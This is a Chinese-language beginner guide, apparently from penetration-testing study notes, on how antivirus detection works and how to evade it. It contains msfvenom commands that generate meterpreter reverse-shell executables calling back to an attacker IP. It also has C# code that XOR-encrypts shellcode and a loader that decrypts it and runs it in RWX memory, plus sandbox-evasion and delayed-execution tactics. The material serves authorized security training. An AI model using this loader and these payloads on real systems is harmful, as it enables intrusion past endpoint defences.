# 杀软绕过 - 新手章节指南

## 这个目录是干什么的？

杀毒软件（杀软）是渗透测试中最常见的障碍。这个目录教你理解杀软是如何工作的，以及如何绕过它们的检测。

---

## 为什么要学这个？

```
现实情况：
├── 几乎所有企业都部署了杀软
├── 你的 Shellcode/工具会被杀软拦截
├── 不会绕过杀软 = 无法完成渗透测试
└── 这是 OSEP 的核心技能

学习目的：
├── 理解杀软的检测原理
├── 学会绕过各种检测机制
├── 在授权测试中成功执行代码
└── 更好地理解如何防御
```

## 通俗理解核心概念

### 杀软的三种检测方式

```
1. 签名检测（Signature-based）
├── 杀软有一个"黑名单"数据库
├── 包含已知恶意软件的"指纹"
├── 扫描文件，匹配指纹
├── 匹配到就报毒
└── 类比：通缉犯照片

2. 启发式检测（Heuristic）
├── 分析代码的"行为特征"
├── 不需要精确匹配
├── 看起来像恶意软件就报警
└── 类比：看行为判断是不是小偷

3. 行为检测（Behavioral）
├── 监控程序运行时的行为
├── 调用敏感 API 就报警
├── 比如：注入其他进程、修改注册表
└── 类比：监控摄像头
```

### 静态、动态、云检测怎么区分？

很多初学者会把“报毒”都看成一个结果，但杀软可能是在不同阶段发现你的样本：

| 检测类型 | 检查时间 | 看什么 | 常见触发点 |
|---|---|---|---|
| 静态检测 | 文件落地或扫描时 | 哈希、字符串、字节序列、PE 结构、宏源码 | 原始 payload、明显字符串、已知 shellcode |
| 启发式检测 | 静态或半动态分析时 | 代码结构、API 组合、可疑导入、熵值 | 加密壳、RWX 内存、下载执行逻辑 |
| 动态检测 | 程序运行时 | 进程行为、内存、线程、注册表、网络 | 注入、创建远程线程、改自启动 |
| 沙箱分析 | 隔离环境运行时 | 行为链、延迟、环境检查、回连 | Sleep 后执行、下载器、C2 连接 |
| 云检测 | 本地或云端查询时 | 信誉、样本相似度、云端模型 | 新文件、低信誉签名、相似家族特征 |

学习绕过时要先判断是哪一类检测在拦你：

```text
复制到磁盘就被删
  -> 更像静态/云检测

运行后才被杀
  -> 更像行为/内存检测

PowerShell 文本一执行就报
  -> 更像 AMSI/脚本扫描

只在目标环境失败，本地不失败
  -> 可能是 EDR、策略、云检测或网络侧阻断
```

### Windows Defender 组件速览

| 组件 | 作用 | 对应学习章节 |
|---|---|---|
| 实时保护 | 文件创建、写入、读取时扫描 | 本章静态检测、签名定位 |
| 云保护 | 上传特征或样本到云端判断 | 本章测试流程 |
| AMSI | 扫描脚本和内存中的内容 | `08-AMSI绕过` |
| 行为监控 | 观察进程、内存、线程、注册表、网络行为 | 本章启发式/行为绕过 |
| 网络保护 | 判断可疑域名和网络连接 | `10-网络过滤绕过` |
| 受控文件夹访问 | 保护敏感目录不被异常写入 | 权限维持和文件写入排错 |

所以本章不是“让 Defender 永远不报”，而是训练你分清：

```text
它在哪里看见了你？
它看见的是文件、脚本、内存、行为还是网络？
你要改的是载荷、加载器、执行方式还是出网方式？
```

### 绕过签名检测

```
方法1：修改代码
├── 改变量名、函数名
├── 改代码结构
├── 让"指纹"不匹配
└── 最简单但效果有限

方法2：加密/编码
├── 把恶意代码加密
├── 运行时再解密
├── 杀软看到的是加密后的数据
└── 常用方法：XOR、AES、Base64

方法3：混淆
├── 把代码变得难以理解
├── 但功能不变
├── 杀软难以分析
└── 工具：Obfuscator
```

### 绕过启发式检测

```
方法1：分离代码
├── 把恶意代码分成多个部分
├── 单独看每个部分都不可疑
├── 运行时再组合
└── 类比：把枪拆成零件过安检

方法2：延迟执行
├── 不要立即执行恶意代码
├── 等待一段时间
├── 或等待特定条件
└── 杀软可能会超时放弃分析

方法3：环境检测
├── 检测是否在沙箱中
├── 如果是沙箱就不执行
├── 只在真实环境中执行
└── 沙箱特征：虚拟机、调试器
```

## 实践任务清单

### 任务1：测试原始 Shellcode 的检测率

```bash
# 在 Kali 上生成原始 Shellcode
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=你的IP LPORT=443 \
    -f exe -o original.exe

# 把 original.exe 复制到 Windows 虚拟机
# 观察 Windows Defender 是否报毒
# 结果：几乎 100% 会被检测
```

### 任务2：使用编码器

```bash
# 使用 shikata_ga_nai 编码器
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=你的IP LPORT=443 \
    -e x64/xor_dynamic \
    -i 5 \
    -f exe -o encoded.exe

# 测试是否还会被检测
# 结果：可能还是会被检测（现代杀软很聪明）
```

### 任务3：自定义加密 Shellcode

```csharp
// 这是一个简单的 XOR 加密示例
using System;

class Program
{
    static byte[] XorEncrypt(byte[] data, byte key)
    {
        byte[] result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
        {
            result[i] = (byte)(data[i] ^ key);
        }
        return result;
    }

    static void Main()
    {
        // 原始 Shellcode
        byte[] shellcode = new byte[] { 0xfc, 0x48, 0x83 };  // 实际使用时替换为完整 shellcode

        // 加密
        byte key = 0x41;
        byte[] encrypted = XorEncrypt(shellcode, key);

        // 输出加密后的 Shellcode
        Console.WriteLine("byte[] encrypted = new byte[] {");
        Console.WriteLine(BitConverter.ToString(encrypted).Replace("-", ", 0x"));
        Console.WriteLine("};");
    }
}
```

### 任务4：运行时解密执行

```csharp
// 运行时解密并执行 Shellcode
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    static byte[] XorDecrypt(byte[] data, byte key)
    {
        byte[] result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
        {
            result[i] = (byte)(data[i] ^ key);
        }
        return result;
    }

    static void Main()
    {
        // 加密后的 Shellcode（杀软看不懂）
        byte[] encrypted = new byte[] { /* 加密后的数据 */ };

        // 运行时解密
        byte key = 0x41;
        byte[] shellcode = XorDecrypt(encrypted, key);

        // 执行
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
```

## 新手排错路线

| 现象 | 优先判断 | 推荐阅读 |
|---|---|---|
| 文件刚落地就被删 | 静态签名、云检测、文件信誉 | `01-杀软检测原理与绕过基础.md`、`09-定位签名详解.md` |
| 加密后仍被删 | 解密器或 PE 结构有特征 | `03-自定义CSharp绕过杀软.md` |
| 运行后才被杀 | 行为检测、敏感 API、内存权限 | `04-启发式检测绕过技术.md`、`11-AV绕过决策树.md` |
| VBA 宏文档报毒 | 宏源码、P-code、字符串、AutoOpen 行为 | `05-VBA宏绕过杀软技术.md`、`07-VBA-Stomping详解.md` |
| PowerShell 报恶意内容 | AMSI 或脚本块扫描 | `08-AMSI绕过/00-章节指南.md` |
| 只在目标机失败 | EDR、策略、云检测、代理/网络 | `13-杀软绕过初学者完整排错手册.md` |

每次实验建议记录：

```text
样本名称：
检测时间：落地时 / 运行时 / 回连时
检测位置：文件 / 脚本 / 内存 / 行为 / 网络
报错文本：
工具位数：
payload 类型：
修改内容：
修改后结果：
下一步：
```
